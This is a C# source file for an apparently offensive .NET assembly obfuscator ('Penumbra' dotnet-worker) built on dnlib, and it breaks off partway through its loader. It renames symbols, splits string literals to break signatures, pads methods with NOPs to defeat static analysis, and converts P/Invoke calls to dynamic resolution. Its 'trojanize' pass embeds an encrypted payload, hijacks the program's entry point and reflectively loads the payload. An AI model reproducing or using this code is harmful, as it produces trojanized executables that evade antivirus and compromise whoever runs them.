// Dotnet IL obfuscation worker — applies dnlib-based passes to .NET assemblies.
// Invoked as subprocess by penumbra.dotnet.il_worker.

using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace DotnetWorker;

internal static class Program
{
    private static int Main(string[] args)
    {
        try
        {
            return Run(args);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"dotnet-worker error: {ex.Message}");
            return 1;
        }
    }

    private static int Run(string[] args)
    {
        string? inputPath = null;
        string? outputPath = null;
        string? passesArg = null;
        string? payloadFile = null;
        string? keyFile = null;
        bool safeRename = false;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--input" when i + 1 < args.Length:
                    inputPath = args[++i];
                    break;
                case "--output" when i + 1 < args.Length:
                    outputPath = args[++i];
                    break;
                case "--passes" when i + 1 < args.Length:
                    passesArg = args[++i];
                    break;
                case "--payload-file" when i + 1 < args.Length:
                    payloadFile = args[++i];
                    break;
                case "--key-file" when i + 1 < args.Length:
                    keyFile = args[++i];
                    break;
                case "--safe-rename":
                    safeRename = true;
                    break;
                default:
                    Console.Error.WriteLine($"Unknown argument: {args[i]}");
                    return 1;
            }
        }

        if (inputPath == null || outputPath == null || passesArg == null)
        {
            Console.Error.WriteLine(
                "Usage: dotnet-worker --input <path> --output <path> --passes <list> [--safe-rename]");
            return 1;
        }

        var passes = passesArg.Split(',', StringSplitOptions.RemoveEmptyEntries);

        Console.Error.WriteLine($"Loading module: {inputPath}");
        var module = ModuleDefMD.Load(inputPath);

        foreach (var pass in passes)
        {
            Console.Error.WriteLine($"Applying pass: {pass}");
            switch (pass.Trim())
            {
                case "rename":
                    ApplyRename(module, safeRename);
                    break;
                case "encrypt-strings":
                    ApplyEncryptStrings(module);
                    break;
                case "flow":
                    ApplyFlow(module);
                    break;
                case "strip-debug":
                    ApplyStripDebug(module);
                    break;
                case "dinvoke":
                    ApplyDInvoke(module);
                    break;
                case "trojanize":
                    if (payloadFile == null || keyFile == null)
                    {
                        Console.Error.WriteLine("trojanize requires --payload-file and --key-file");
                        return 1;
                    }
                    ApplyTrojanize(module, payloadFile, keyFile);
                    break;
                default:
                    Console.Error.WriteLine($"Unknown pass: {pass}");
                    return 1;
            }
        }

        Console.Error.WriteLine($"Writing output: {outputPath}");
        var opts = new dnlib.DotNet.Writer.ModuleWriterOptions(module)
        {
            MetadataOptions = { Flags = dnlib.DotNet.Writer.MetadataFlags.KeepOldMaxStack }
        };
        module.Write(outputPath, opts);
        Console.Error.WriteLine("Done.");
        return 0;
    }

    // ── Rename pass ──────────────────────────────────────────────────────

    private static string RandomId()
    {
        return "_" + Guid.NewGuid().ToString("N")[..8];
    }

    private static HashSet<string> CollectStringLiterals(ModuleDef module)
    {
        var strings = new HashSet<string>(StringComparer.Ordinal);
        foreach (var type in module.GetTypes())
        {
            foreach (var method in type.Methods)
            {
                if (!method.HasBody) continue;
                foreach (var instr in method.Body.Instructions)
                {
                    if (instr.OpCode == OpCodes.Ldstr && instr.Operand is string s)
                        strings.Add(s);
                }
            }
        }
        return strings;
    }

    private static bool IsInterfaceImpl(MethodDef method)
    {
        // Skip methods that implement interfaces or are virtual/override
        if (method.IsVirtual || method.IsAbstract || method.IsNewSlot) return true;
        if (method.HasOverrides) return true;
        // Check if the declaring type implements any interfaces
        var type = method.DeclaringType;
        if (type != null && type.HasInterfaces)
        {
            foreach (var iface in type.Interfaces)
            {
                var ifaceType = iface.Interface.ResolveTypeDef();
                if (ifaceType == null) continue;
                foreach (var ifaceMethod in ifaceType.Methods)
                {
                    if (ifaceMethod.Name == method.Name) return true;
                }
            }
        }
        return false;
    }

    private static bool IsCompilerGenerated(IHasCustomAttribute member)
    {
        return member.CustomAttributes.Any(a =>
            a.TypeFullName == "System.Runtime.CompilerServices.CompilerGeneratedAttribute");
    }

    private static bool IsSpecialType(TypeDef type)
    {
        var name = type.Name.String;
        // Compiler-generated types: async state machines, closures, iterators
        return name.Contains('<') || name.Contains('>') || name.StartsWith("$");
    }

    private static void ApplyRename(ModuleDef module, bool safeRename)
    {
        var entryPoint = module.EntryPoint;
        var literals = safeRename ? CollectStringLiterals(module) : new HashSet<string>();

        foreach (var type in module.GetTypes().ToList())
        {
            if (type.IsGlobalModuleType) continue;
            if (type.IsInterface) continue;
            if (IsSpecialType(type)) continue; // compiler-generated types
            if (IsCompilerGenerated(type)) continue;
            if (safeRename && literals.Contains(type.Name.String)) continue;

            // Don't rename types with interfaces, enums, or value types
            if (!type.HasInterfaces && !type.IsEnum && !type.IsValueType)
                type.Name = RandomId();

            foreach (var method in type.Methods)
            {
                if (method.IsConstructor) continue;
                if (method == entryPoint) continue;
                if (IsInterfaceImpl(method)) continue;
                if (method.IsSpecialName) continue;
                if (IsCompilerGenerated(method)) continue;
                if (safeRename && literals.Contains(method.Name.String)) continue;
                method.Name = RandomId();
            }

            foreach (var field in type.Fields)
            {
                if (IsCompilerGenerated(field)) continue;
                // Skip fields with compiler-generated names (backing fields, closures)
                if (field.Name.String.Contains('<') || field.Name.String.Contains('>')) continue;
                if (safeRename && literals.Contains(field.Name.String)) continue;
                field.Name = RandomId();
            }

            foreach (var prop in type.Properties)
            {
                if (safeRename && literals.Contains(prop.Name.String)) continue;
                prop.Name = RandomId();
            }
        }
    }

    // ── Encrypt-strings pass ─────────────────────────────────────────────

    /// <summary>
    /// Loads the dotnet-worker's own compiled assembly via dnlib, so we can clone
    /// reference methods (Decrypt, LoadPayload) into target modules.
    /// </summary>
    private static ModuleDef LoadSelfModule()
    {
        var selfPath = typeof(Program).Assembly.Location;
        return ModuleDefMD.Load(selfPath);
    }

    /// <summary>
    /// Clones a method from the self-module into the target module using Importer.
    /// Returns the new MethodDef added to the target's global type.
    /// </summary>
    private static MethodDefUser CloneMethodIntoTarget(
        ModuleDef targetModule, ModuleDef selfModule, string typeName, string methodName)
    {
        // Find the source method in self-module
        TypeDef? sourceType = null;
        foreach (var t in selfModule.GetTypes())
        {
            if (t.Name == typeName || t.FullName.EndsWith("." + typeName))
            {
                sourceType = t;
                break;
            }
        }
        if (sourceType == null)
            throw new Exception($"Cannot find type '{typeName}' in self-module");

        MethodDef? sourceMethod = null;
        foreach (var m in sourceType.Methods)
        {
            if (m.Name == methodName)
            {
                sourceMethod = m;
                break;
            }
        }
        if (sourceMethod == null)
            throw new Exception($"Cannot find method '{methodName}' in type '{typeName}'");

        // Create Importer to translate all references to the target module's context
        var importer = new Importer(targetModule);

        // Clone the method signature
        var newSig = importer.Import(sourceMethod.MethodSig);

        var cloned = new MethodDefUser(
            RandomId(),
            newSig as MethodSig ?? sourceMethod.MethodSig,
            MethodImplAttributes.IL | MethodImplAttributes.Managed,
            MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.HideBySig);

        // Clone the body
        cloned.Body = new CilBody();
        cloned.Body.InitLocals = sourceMethod.Body.InitLocals;

        // Clone local variables
        foreach (var local in sourceMethod.Body.Variables)
        {
            var importedType = importer.Import(local.Type);
            cloned.Body.Variables.Add(new Local(importedType));
        }

        // Clone exception handlers
        // We need to build the instruction list first, then fix up handler references
        var oldToNew = new Dictionary<Instruction, Instruction>();

        // First pass: clone all instructions (operands fixed in second pass)
        foreach (var instr in sourceMethod.Body.Instructions)
        {
            var newInstr = new Instruction(instr.OpCode);
            newInstr.Operand = instr.Operand; // will fix below
            oldToNew[instr] = newInstr;
            cloned.Body.Instructions.Add(newInstr);
        }

        // Second pass: fix operands
        foreach (var newInstr in cloned.Body.Instructions)
        {
            var operand = newInstr.Operand;
            if (operand is Instruction targetInstr)
            {
                newInstr.Operand = oldToNew[targetInstr];
            }
            else if (operand is Instruction[] targets)
            {
                var newTargets = new Instruction[targets.Length];
                for (int i = 0; i < targets.Length; i++)
                    newTargets[i] = oldToNew[targets[i]];
                newInstr.Operand = newTargets;
            }
            else if (operand is ITypeDefOrRef typeRef)
            {
                newInstr.Operand = importer.Import(typeRef);
            }
            else if (operand is IMethod methodRef)
            {
                newInstr.Operand = importer.Import(methodRef);
            }
            else if (operand is IField fieldRef)
            {
                newInstr.Operand = importer.Import(fieldRef);
            }
            else if (operand is MemberRef memberRef)
            {
                newInstr.Operand = importer.Import(memberRef);
            }
            else if (operand is Local local)
            {
                // Map to the corresponding local in the cloned body
                int idx = sourceMethod.Body.Variables.IndexOf(local);
                if (idx >= 0)
                    newInstr.Operand = cloned.Body.Variables[idx];
            }
            else if (operand is Parameter param)
            {
                // Map to the corresponding parameter in the cloned method
                int idx = sourceMethod.Parameters.IndexOf(param);
                if (idx >= 0 && idx < cloned.Parameters.Count)
                    newInstr.Operand = cloned.Parameters[idx];
            }
            // string, int, etc. operands stay as-is
        }

        // Clone exception handlers
        foreach (var eh in sourceMethod.Body.ExceptionHandlers)
        {
            var newEh = new ExceptionHandler(eh.HandlerType);
            if (eh.TryStart != null) newEh.TryStart = oldToNew[eh.TryStart];
            if (eh.TryEnd != null) newEh.TryEnd = oldToNew[eh.TryEnd];
            if (eh.HandlerStart != null) newEh.HandlerStart = oldToNew[eh.HandlerStart];
            if (eh.HandlerEnd != null) newEh.HandlerEnd = oldToNew[eh.HandlerEnd];
            if (eh.FilterStart != null) newEh.FilterStart = oldToNew[eh.FilterStart];
            if (eh.CatchType != null) newEh.CatchType = importer.Import(eh.CatchType);
            cloned.Body.ExceptionHandlers.Add(newEh);
        }

        cloned.Body.SimplifyBranches();
        cloned.Body.OptimizeBranches();

        // Compute MaxStack — critical because KeepOldMaxStack in the writer options
        // means dnlib won't recalculate it, so a new method defaults to MaxStack=0
        // which causes InvalidProgramException at runtime.
        cloned.Body.UpdateInstructionOffsets();
        cloned.Body.MaxStack = (ushort)CalculateMaxStack(cloned.Body);

        return cloned;
    }

    /// <summary>
    /// Simple max-stack calculator for CIL bodies (conservative estimate).
    /// Walks through instructions linearly and tracks the stack depth.
    /// </summary>
    private static int CalculateMaxStack(CilBody body)
    {
        // Use dnlib's built-in max stack calculation by temporarily
        // writing the method to get the computed value.
        // Simpler approach: just set a generous max stack.
        // The CLR verifier is lenient with MaxStack being too high,
        // but crashes on MaxStack being too low.
        // A safe upper bound is 16 for our Decrypt/LoadPayload methods.
        // For correctness, walk the instruction stream.
        int current = 0;
        int max = 0;

        foreach (var instr in body.Instructions)
        {
            // Approximate push/pop counts based on opcode
            instr.CalculateStackUsage(out int pushes, out int pops);
            if (pops == -1) // Special: leave, endfilter, etc clear stack
                current = 0;
            else
                current -= pops;
            current += pushes;
            if (current > max) max = current;
            if (current < 0) current = 0; // shouldn't happen in valid IL
        }

        // Add a safety margin
        return Math.Max(max, 8);
    }

    private static void ApplyEncryptStrings(ModuleDef module)
    {
        // Strategy: split each string literal in half and reassemble with String.Concat.
        // This breaks exact string signatures while preserving runtime behavior.
        // No new types or methods added — only a single MemberRef for String.Concat.
        var concat = new MemberRefUser(module, "Concat",
            MethodSig.CreateStatic(module.CorLibTypes.String,
                module.CorLibTypes.String, module.CorLibTypes.String),
            module.CorLibTypes.String.TypeDefOrRef);

        int count = 0;

        foreach (var type in module.GetTypes())
        {
            // Skip compiler-generated types (async state machines, closures)
            if (IsSpecialType(type)) continue;

            foreach (var method in type.Methods)
            {
                if (!method.HasBody) continue;
                if (method.IsConstructor) continue;
                // Skip methods that reference async state machines — modifying
                // their bodies can corrupt field tokens for ILMerged assemblies
                if (method.Body.Instructions.Any(i =>
                    i.Operand is ITypeDefOrRef t && (t.Name.String.Contains('<')
                        || t.Name.String.Contains('>'))))
                    continue;

                var instrs = method.Body.Instructions;
                bool modified = false;
                for (int i = 0; i < instrs.Count; i++)
                {
                    if (instrs[i].OpCode != OpCodes.Ldstr || instrs[i].Operand is not string s)
                        continue;
                    if (s.Length < 4) continue; // too short to split meaningfully

                    // Split at a random point
                    int mid = s.Length / 3 + RandomNumberGenerator.GetInt32(s.Length / 3 + 1);
                    if (mid <= 0 || mid >= s.Length) mid = s.Length / 2;

                    // Modify existing ldstr in-place (preserves branch targets)
                    instrs[i].Operand = s[..mid];
                    instrs.Insert(i + 1, OpCodes.Ldstr.ToInstruction(s[mid..]));
                    instrs.Insert(i + 2, OpCodes.Call.ToInstruction(concat));
                    i += 2;
                    count++;
                    modified = true;
                }
                if (modified)
                {
                    method.Body.SimplifyBranches();
                    method.Body.OptimizeBranches();
                }
            }
        }
        Console.Error.WriteLine($"  [encrypt-strings] split {count} string literals");
    }

    // ── Flow pass ────────────────────────────────────────────────────────

    private static void ApplyFlow(ModuleDef module)
    {
        // Simplified flow pass: NOP padding only.
        // Opaque predicates removed — they produced InvalidProgramException due to
        // stack imbalance issues. NOPs alone still defeat basic static analysis
        // pattern matching by shifting instruction offsets.
        var rng = new Random();
        foreach (var type in module.GetTypes())
        {
            if (IsSpecialType(type)) continue;
            foreach (var method in type.Methods)
            {
                if (!method.HasBody) continue;
                var instrs = method.Body.Instructions;
                if (instrs.Count < 2) continue;

                // Insert NOP padding at random positions (work backwards to avoid index shift)
                for (int i = instrs.Count - 1; i >= 1; i--)
                {
                    if (rng.NextDouble() < 0.3) // 30% chance at each position
                    {
                        int nopCount = rng.Next(1, 4); // 1-3 NOPs
                        for (int n = 0; n < nopCount; n++)
                            instrs.Insert(i, OpCodes.Nop.ToInstruction());
                    }
                }

                method.Body.SimplifyBranches();
                method.Body.OptimizeBranches();
            }
        }
    }

    // ── DInvoke mutation pass ─────────────────────────────────────────────

    private static bool IsSafeForDInvoke(MethodDef method)
    {
        // Conservative: only mutate PInvoke methods with "simple" parameter types.
        // Skip methods with by-ref struct params, function pointer callbacks, etc.
        if (method.Parameters.Count == 0) return true;

        foreach (var param in method.Parameters)
        {
            var t = param.Type;
            if (t == null) continue;
            // Allow: primitives, string, IntPtr, UIntPtr, pointers, byte[]
            if (t.IsPrimitive) continue;
            if (t.FullName is "System.String" or "System.IntPtr" or "System.UIntPtr") continue;
            if (t.IsPointer) continue;
            if (t is SZArraySig arr && arr.Next.IsPrimitive) continue;
            if (t is ByRefSig byRef)
            {
                var inner = byRef.Next;
                if (inner.IsPrimitive) continue;
                if (inner.FullName is "System.IntPtr" or "System.UIntPtr") continue;
                // By-ref struct — skip this method entirely
                return false;
            }
            // ValueType (struct passed by value) — risky marshalling, skip
            if (t is ValueTypeSig) return false;
            // Anything else exotic — skip
            if (t is GenericInstSig or FnPtrSig) return false;
        }
        return true;
    }

    private static void ApplyDInvoke(ModuleDef module)
    {
        // Import System.Runtime.InteropServices references we'll need
        var marshalTypeRef = module.CorLibTypes.GetTypeRef(
            "System.Runtime.InteropServices", "Marshal");
        var nativeLibTypeRef = new TypeRefUser(module,
            "System.Runtime.InteropServices", "NativeLibrary",
            module.CorLibTypes.AssemblyRef);
        var intPtrType = module.CorLibTypes.IntPtr;

        // NativeLibrary.Load(string) -> IntPtr
        var nativeLibLoad = new MemberRefUser(module, "Load",
            MethodSig.CreateStatic(intPtrType, module.CorLibTypes.String),
            nativeLibTypeRef);

        // NativeLibrary.GetExport(IntPtr, string) -> IntPtr
        var nativeLibGetExport = new MemberRefUser(module, "GetExport",
            MethodSig.CreateStatic(intPtrType, intPtrType, module.CorLibTypes.String),
            nativeLibTypeRef);

        // Collect all PInvoke methods to mutate
        var pinvokeMethods = new List<(MethodDef method, string dllName, string entryPoint)>();
        foreach (var type in module.GetTypes())
        {
            foreach (var method in type.Methods)
            {
                if (!method.IsPinvokeImpl || method.ImplMap == null) continue;
                if (!IsSafeForDInvoke(method)) {
                    Console.Error.WriteLine($"  [dinvoke] skipping (complex params): {method.FullName}");
                    continue;
                }
                var implMap = method.ImplMap;
                pinvokeMethods.Add((method, implMap.Module.Name.String, implMap.Name.String));
            }
        }

        Console.Error.WriteLine($"  [dinvoke] found {pinvokeMethods.Count} PInvoke methods to mutate");

        // Create a static helper class to hold resolver fields and delegates
        var helperType = new TypeDefUser(
            "Penumbra_DInvoke", RandomId(),
            module.CorLibTypes.Object.TypeDefOrRef);
        helperType.Attributes = TypeAttributes.NotPublic | TypeAttributes.Sealed
            | TypeAttributes.Abstract; // static class
        module.Types.Add(helperType);

        // Cache: dll name -> library handle field
        var libHandleFields = new Dictionary<string, FieldDef>(StringComparer.OrdinalIgnoreCase);

        foreach (var (method, dllName, entryPoint) in pinvokeMethods)
        {
            // 1. Create a delegate type matching the PInvoke signature
            var delegateType = CreateDelegateType(module, method, helperType);

            // 2. Create a static field to cache the delegate instance
            var delegateField = new FieldDefUser(
                RandomId(),
                new FieldSig(new ClassSig(delegateType)),
                FieldAttributes.Private | FieldAttributes.Static);
            helperType.Fields.Add(delegateField);

            // 3. Ensure we have a library handle field for this DLL
            if (!libHandleFields.TryGetValue(dllName, out var libField))
            {
                libField = new FieldDefUser(
                    RandomId(),
                    new FieldSig(intPtrType),
                    FieldAttributes.Private | FieldAttributes.Static);
                helperType.Fields.Add(libField);
                libHandleFields[dllName] = libField;
            }

            // 4. Create a resolver method that lazily initializes the delegate
            var resolverMethod = CreateResolverMethod(
                module, method, delegateType, delegateField, libField,
                dllName, entryPoint, nativeLibLoad, nativeLibGetExport,
                marshalTypeRef, helperType);

            // 5. Remove PInvoke metadata from the original method
            method.IsPinvokeImpl = false;
            method.ImplMap = null;
            method.Attributes &= ~MethodAttributes.PinvokeImpl;
            method.Attributes |= MethodAttributes.Static; // ensure static
            method.ImplAttributes = MethodImplAttributes.IL | MethodImplAttributes.Managed;

            // 6. Replace the method body: call the resolver, which returns delegate, then invoke it
            method.Body = new CilBody();
            var body = method.Body;
            body.InitLocals = true;

            // Call resolver to get delegate
            body.Instructions.Add(OpCodes.Call.ToInstruction(resolverMethod));

            // Push all original parameters
            for (int i = 0; i < method.Parameters.Count; i++)
            {
                body.Instructions.Add(new Instruction(OpCodes.Ldarg, method.Parameters[i]));
            }

            // Find the Invoke method on the delegate type
            var invokeMethod = delegateType.FindMethod("Invoke");
            body.Instructions.Add(OpCodes.Callvirt.ToInstruction(invokeMethod));
            body.Instructions.Add(OpCodes.Ret.ToInstruction());
            body.OptimizeBranches();
            body.OptimizeMacros();
        }
    }

    private static TypeDefUser CreateDelegateType(
        ModuleDef module, MethodDef pinvokeMethod, TypeDef parentType)
    {
        // Create: sealed class <name> : System.MulticastDelegate
        var multicastDelegateRef = new TypeRefUser(module, "System", "MulticastDelegate",
            module.CorLibTypes.AssemblyRef);

        var delegateType = new TypeDefUser(
            parentType.Namespace, RandomId(), multicastDelegateRef);
        delegateType.Attributes = TypeAttributes.NotPublic | TypeAttributes.Sealed;

        // .ctor(object, IntPtr)
        var ctorSig = MethodSig.CreateInstance(
            module.CorLibTypes.Void,
            module.CorLibTypes.Object,
            module.CorLibTypes.IntPtr);
        var ctor = new MethodDefUser(".ctor", ctorSig,
            MethodImplAttributes.Runtime | MethodImplAttributes.Managed,
            MethodAttributes.Public | MethodAttributes.HideBySig
            | MethodAttributes.SpecialName | MethodAttributes.RTSpecialName);
        delegateType.Methods.Add(ctor);

        // Build the Invoke signature matching the PInvoke method
        var paramTypes = new List<TypeSig>();
        foreach (var param in pinvokeMethod.MethodSig.Params)
            paramTypes.Add(param);

        var invokeSig = MethodSig.CreateInstance(
            pinvokeMethod.MethodSig.RetType, paramTypes.ToArray());
        var invokeMethod = new MethodDefUser("Invoke", invokeSig,
            MethodImplAttributes.Runtime | MethodImplAttributes.Managed,
            MethodAttributes.Public | MethodAttributes.HideBySig
            | MethodAttributes.NewSlot | MethodAttributes.Virtual);

        // Copy parameter names and marshal attributes from the PInvoke method
        for (int i = 0; i < pinvokeMethod.ParamDefs.Count; i++)
        {
            var origParam = pinvokeMethod.ParamDefs[i];
            var newParam = new ParamDefUser(origParam.Name, origParam.Sequence, origParam.Attributes);
            if (origParam.MarshalType != null)
                newParam.MarshalType = origParam.MarshalType;
            invokeMethod.ParamDefs.Add(newParam);
        }

        // Copy return type marshal info
        if (pinvokeMethod.Parameters.ReturnParameter.ParamDef?.MarshalType != null)
        {
            var retParam = new ParamDefUser("", 0, 0);
            retParam.MarshalType = pinvokeMethod.Parameters.ReturnParameter.ParamDef.MarshalType;
            invokeMethod.ParamDefs.Insert(0, retParam);
        }

        delegateType.Methods.Add(invokeMethod);
        module.Types.Add(delegateType);

        return delegateType;
    }

    private static MethodDefUser CreateResolverMethod(
        ModuleDef module, MethodDef pinvokeMethod,
        TypeDefUser delegateType, FieldDef delegateField, FieldDef libField,
        string dllName, string entryPoint,
        MemberRefUser nativeLibLoad, MemberRefUser nativeLibGetExport,
        TypeRef marshalTypeRef, TypeDef helperType)
    {
        // static DelegateType Resolve()
        // {
        //     if (cachedDelegate == null)
        //     {
        //         if (libHandle == IntPtr.Zero)
        //             libHandle = NativeLibrary.Load("dllName");
        //         var ptr = NativeLibrary.GetExport(libHandle, "entryPoint");
        //         cachedDelegate = Marshal.GetDelegateForFunctionPointer<DelegateType>(ptr);
        //     }
        //     return cachedDelegate;
        // }

        var delegateSig = new ClassSig(delegateType);
        var resolverSig = MethodSig.CreateStatic(delegateSig);
        var resolver = new MethodDefUser(RandomId(), resolverSig,
            MethodImplAttributes.IL | MethodImplAttributes.Managed,
            MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.HideBySig);

        resolver.Body = new CilBody();
        var body = resolver.Body;
        body.InitLocals = true;
        body.Variables.Add(new Local(module.CorLibTypes.IntPtr)); // loc0: funcPtr

        // Marshal.GetDelegateForFunctionPointer<T>(IntPtr) - generic method
        // We need to reference the generic method and instantiate it
        var getDelegateGeneric = new MemberRefUser(module, "GetDelegateForFunctionPointer",
            MethodSig.CreateStatic(new GenericMVar(0), module.CorLibTypes.IntPtr),
            marshalTypeRef);
        // Create the MethodSpec for the generic instantiation
        var getDelegateSpec = new MethodSpecUser(getDelegateGeneric,
            new GenericInstMethodSig(delegateSig));

        var intPtrZero = new MemberRefUser(module, "get_Zero",
            MethodSig.CreateStatic(module.CorLibTypes.IntPtr),
            module.CorLibTypes.GetTypeRef("System", "IntPtr"));

        var intPtrOpEquality = new MemberRefUser(module, "op_Equality",
            MethodSig.CreateStatic(module.CorLibTypes.Boolean,
                module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr),
            module.CorLibTypes.GetTypeRef("System", "IntPtr"));

        var returnLabel = OpCodes.Ldsfld.ToInstruction(delegateField);

        // if (cachedDelegate != null) goto return
        body.Instructions.Add(OpCodes.Ldsfld.ToInstruction(delegateField));
        var brIfCached = OpCodes.Brtrue.ToInstruction(returnLabel);
        body.Instructions.Add(brIfCached);

        // if (libHandle == IntPtr.Zero) libHandle = NativeLibrary.Load(dllName)
        var skipLoad = OpCodes.Nop.ToInstruction();
        body.Instructions.Add(OpCodes.Ldsfld.ToInstruction(libField));
        body.Instructions.Add(OpCodes.Call.ToInstruction(intPtrZero));
        body.Instructions.Add(OpCodes.Call.ToInstruction(intPtrOpEquality));
        body.Instructions.Add(OpCodes.Brfalse.ToInstruction(skipLoad));
        body.Instructions.Add(OpCodes.Ldstr.ToInstruction(dllName));
        body.Instructions.Add(OpCodes.Call.ToInstruction(nativeLibLoad));
        body.Instructions.Add(OpCodes.Stsfld.ToInstruction(libField));
        body.Instructions.Add(skipLoad);

        // var ptr = NativeLibrary.GetExport(libHandle, entryPoint)
        body.Instructions.Add(OpCodes.Ldsfld.ToInstruction(libField));
        body.Instructions.Add(OpCodes.Ldstr.ToInstruction(entryPoint));
        body.Instructions.Add(OpCodes.Call.ToInstruction(nativeLibGetExport));
        body.Instructions.Add(OpCodes.Stloc_0.ToInstruction());

        // cachedDelegate = Marshal.GetDelegateForFunctionPointer<DelegateType>(ptr)
        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
        body.Instructions.Add(OpCodes.Call.ToInstruction(getDelegateSpec));
        body.Instructions.Add(OpCodes.Stsfld.ToInstruction(delegateField));

        // return cachedDelegate
        body.Instructions.Add(returnLabel);
        body.Instructions.Add(OpCodes.Ret.ToInstruction());

        body.SimplifyBranches();
        body.OptimizeBranches();
        body.OptimizeMacros();

        helperType.Methods.Add(resolver);
        return resolver;
    }

    // ── Trojanize pass ──────────────────────────────────────────────────

    private static void ApplyTrojanize(ModuleDef module, string payloadFile, string keyFile)
    {
        var payloadB64 = File.ReadAllText(payloadFile).Trim();
        var keyB64 = File.ReadAllText(keyFile).Trim();

        Console.Error.WriteLine($"  [trojanize] payload size: {payloadB64.Length} chars (base64)");

        // 1. Add encrypted payload and key as embedded resources
        var resourceName = RandomId().TrimStart('_') + ".dat";
        var keyResourceName = RandomId().TrimStart('_') + ".key";

        module.Resources.Add(new EmbeddedResource(resourceName, Encoding.UTF8.GetBytes(payloadB64)));
        module.Resources.Add(new EmbeddedResource(keyResourceName, Encoding.UTF8.GetBytes(keyB64)));

        // 2. Find the entry point
        var entryPoint = module.EntryPoint;
        if (entryPoint == null)
        {
            Console.Error.WriteLine("  [trojanize] warning: no entry point found, skipping");
            return;
        }

        Console.Error.WriteLine($"  [trojanize] hijacking entry point: {entryPoint.FullName}");
        var entryType = entryPoint.DeclaringType;
        var byteArraySig = new SZArraySig(module.CorLibTypes.Byte);
        var objectArraySig = new SZArraySig(module.CorLibTypes.Object);

        // 3. Import all required method references
        var asmRef = module.CorLibTypes.AssemblyRef;
        var typeTypeRef = module.CorLibTypes.GetTypeRef("System", "Type");
        var asmTypeRef = new TypeRefUser(module, "System.Reflection", "Assembly", asmRef);
        var streamTypeRef = new TypeRefUser(module, "System.IO", "Stream", asmRef);
        var srTypeRef = new TypeRefUser(module, "System.IO", "StreamReader", asmRef);
        var trTypeRef = new TypeRefUser(module, "System.IO", "TextReader", asmRef);
        var mbTypeRef = new TypeRefUser(module, "System.Reflection", "MethodBase", asmRef);
        var miTypeRef = new TypeRefUser(module, "System.Reflection", "MethodInfo", asmRef);
        var piTypeRef = new TypeRefUser(module, "System.Reflection", "ParameterInfo", asmRef);
        var convertRef = module.CorLibTypes.GetTypeRef("System", "Convert");

        var asmSig = new ClassSig(asmTypeRef);
        var streamSig = new ClassSig(streamTypeRef);
        var miSig = new ClassSig(miTypeRef);

        var getTypeFromHandle = new MemberRefUser(module, "GetTypeFromHandle",
            MethodSig.CreateStatic(new ClassSig(typeTypeRef),
                new ValueTypeSig(module.CorLibTypes.GetTypeRef("System", "RuntimeTypeHandle"))),
            typeTypeRef);
        var getAssembly = new MemberRefUser(module, "get_Assembly",
            MethodSig.CreateInstance(asmSig), typeTypeRef);
        var getResStream = new MemberRefUser(module, "GetManifestResourceStream",
            MethodSig.CreateInstance(streamSig, module.CorLibTypes.String), asmTypeRef);
        var srCtor = new MemberRefUser(module, ".ctor",
            MethodSig.CreateInstance(module.CorLibTypes.Void, streamSig), srTypeRef);
        var readToEnd = new MemberRefUser(module, "ReadToEnd",
            MethodSig.CreateInstance(module.CorLibTypes.String), trTypeRef);
        var fromBase64 = new MemberRefUser(module, "FromBase64String",
            MethodSig.CreateStatic(byteArraySig, module.CorLibTypes.String), convertRef);
        var asmLoad = new MemberRefUser(module, "Load",
            MethodSig.CreateStatic(asmSig, byteArraySig), asmTypeRef);
        var getEntryPt = new MemberRefUser(module, "get_EntryPoint",
            MethodSig.CreateInstance(miSig), asmTypeRef);
        var getParams = new MemberRefUser(module, "GetParameters",
            MethodSig.CreateInstance(new SZArraySig(new ClassSig(piTypeRef))), mbTypeRef);
        var invoke = new MemberRefUser(module, "Invoke",
            MethodSig.CreateInstance(module.CorLibTypes.Object,
                module.CorLibTypes.Object, objectArraySig), mbTypeRef);

        // 4. Build the loader IL directly in the entry point body
        // Follows the exact pattern from the C# compiler output of LoadPayload()
        entryPoint.Body = new CilBody();
        var body = entryPoint.Body;
        body.InitLocals = true;

        // Locals: string payloadStr, byte[] enc, byte[] key, byte[] plain,
        //         MethodInfo ep, object[] invokeArgs, int i
        body.Variables.Add(new Local(module.CorLibTypes.String));    // 0
        body.Variables.Add(new Local(byteArraySig));                // 1 enc
        body.Variables.Add(new Local(byteArraySig));                // 2 key
        body.Variables.Add(new Local(byteArraySig));                // 3 plain
        body.Variables.Add(new Local(miSig));                       // 4 ep
        body.Variables.Add(new Local(objectArraySig));              // 5 invokeArgs
        body.Variables.Add(new Local(module.CorLibTypes.Int32));     // 6 i

        var I = body.Instructions;

        // var asm = typeof(EntryType).Assembly;
        I.Add(OpCodes.Ldtoken.ToInstruction(entryType));
        I.Add(OpCodes.Call.ToInstruction(getTypeFromHandle));
        I.Add(OpCodes.Callvirt.ToInstruction(getAssembly));

        // payloadStr = new StreamReader(asm.GetManifestResourceStream("name")).ReadToEnd()
        I.Add(OpCodes.Dup.ToInstruction());
        I.Add(OpCodes.Ldstr.ToInstruction(resourceName));
        I.Add(OpCodes.Callvirt.ToInstruction(getResStream));
        I.Add(OpCodes.Newobj.ToInstruction(srCtor));
        I.Add(OpCodes.Callvirt.ToInstruction(readToEnd));
        I.Add(OpCodes.Stloc_0.ToInstruction()); // payloadStr

        // keyStr -> directly call FromBase64String (reuse stack)
        I.Add(OpCodes.Ldstr.ToInstruction(keyResourceName));
        I.Add(OpCodes.Callvirt.ToInstruction(getResStream));
        I.Add(OpCodes.Newobj.ToInstruction(srCtor));
        I.Add(OpCodes.Callvirt.ToInstruction(readToEnd));
        // keyB64 str on stack, decode immediately
        I.Add(OpCodes.Call.ToInstruction(fromBase64));
        I.Add(OpCodes.Stloc_2.ToInstruction()); // key bytes

        // enc = Convert.FromBase64String(payloadStr)
        I.Add(OpCodes.Ldloc_0.ToInstruction());
        I.Add(OpCodes.Call.ToInstruction(fromBase64));
        I.Add(OpCodes.Stloc_1.ToInstruction()); // enc

        // plain = new byte[enc.Length]
        I.Add(OpCodes.Ldloc_1.ToInstruction());
        I.Add(OpCodes.Ldlen.ToInstruction());
        I.Add(OpCodes.Conv_I4.ToInstruction());
